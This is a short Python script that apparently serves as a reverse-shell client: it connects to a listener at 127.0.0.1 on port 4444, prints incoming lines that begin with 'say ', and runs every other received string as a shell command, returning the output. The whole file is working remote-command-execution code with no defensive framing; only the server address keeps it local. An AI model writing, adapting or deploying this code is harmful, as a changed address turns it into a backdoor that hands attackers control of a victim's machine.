import socket
import subprocess

SERVER_IP = "127.0.0.1"
SERVER_PORT = 4444

client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
client_socket.connect((SERVER_IP, SERVER_PORT))

try:
    while True:
        # Receive command
        data = client_socket.recv(4096)
        if not data:
            break

        command = data.decode().strip()

        # If starts with "say ", just print it
        if command.startswith("say "):
            message = command[4:]
            print(f"[MESSAGE] {message}")
            client_socket.send(f"Displayed message: {message}\n".encode())
        else:
            # Otherwise, execute it
            result = subprocess.run(command, shell=True, capture_output=True, text=True)
            output = result.stdout + result.stderr
            if not output:
                output = "Command executed, no output.\n"
            client_socket.send(output.encode())
finally:
    client_socket.close()
